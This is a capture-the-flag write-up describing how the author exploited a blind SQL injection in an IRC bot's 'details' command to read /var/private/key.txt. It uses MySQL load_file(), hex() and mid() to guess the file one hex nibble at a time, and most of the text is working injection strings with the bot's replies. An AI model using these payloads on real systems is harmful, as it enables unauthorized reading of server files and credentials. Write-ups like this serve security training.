Robot Superiority
=================

## Category: Exploiting

This challenge is to recover the file "/var/private/key.txt" from an IRC bot.

Messaging "help" to the bot reveals the following commands:

```
help; details [movie id]; search [keyword]; add movie [title]; add robot [movie id] [name]
```

The bot stores information about robots that apear in movies.

I found that the ```details``` command doesn't properly sanatize inputs, and is vulnerable to SQL injection.

```
me  > details 7
bot > Firefly: hi; poop; fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; (48 total)

me  > details 7'/**/AND/**/''='
bot > Firefly: hi; poop; fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; (48 total)

me  > details 7'/**/AND/**/'asfd'='
bot > Firefly: hi; poop; fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; (0 total)
```

The important thing to notice is the ```(0 total)``` response to the last query.  The vulnerable query is the one that counts the number of records.  This is the only way I found to get information back from my injection string.

The key file can be loaded from the database using the MySQL function ```load_file()```.  My method of recovering its contents was to convert the contents into a hex string using ```hex()```, then guess one nibble at a time.  irc.py is an implementation of this method.

```
me  > details 7'/**/and/**/(select/**/mid(hex(load_file('/var/private/key.txt')),/**/1,/**/1))='0'/**/and/**/''='
bot > Firefly: hi; poop; fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; (0 total)

me  > details 7'/**/and/**/(select/**/mid(hex(load_file('/var/private/key.txt')),/**/1,/**/1))='1'/**/and/**/''='
bot > Firefly: hi; poop; fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; (0 total)

me  > details 7'/**/and/**/(select/**/mid(hex(load_file('/var/private/key.txt')),/**/1,/**/1))='2'/**/and/**/''='
bot > Firefly: hi; poop; fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; (0 total)

me  > details 7'/**/and/**/(select/**/mid(hex(load_file('/var/private/key.txt')),/**/1,/**/1))='3'/**/and/**/''='
bot > Firefly: hi; poop; fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; (48 total)

me  > details 7'/**/and/**/(select/**/mid(hex(load_file('/var/private/key.txt')),/**/2,/**/1))='0'/**/and/**/''='
bot > Firefly: hi; poop; fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; (0 total)


...

me  > details 7'/**/and/**/(select/**/mid(hex(load_file('/var/private/key.txt')),/**/130,/**/1))='9'/**/and/**/''='
bot > Firefly: fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; test; test; (0 total)

me  > details 7'/**/and/**/(select/**/mid(hex(load_file('/var/private/key.txt')),/**/130,/**/1))='A'/**/and/**/''='
bot > Firefly: fu'; hello''!"#¤%&/()=?`^'^-{[]}´; 2; test; test; (48 total)
```
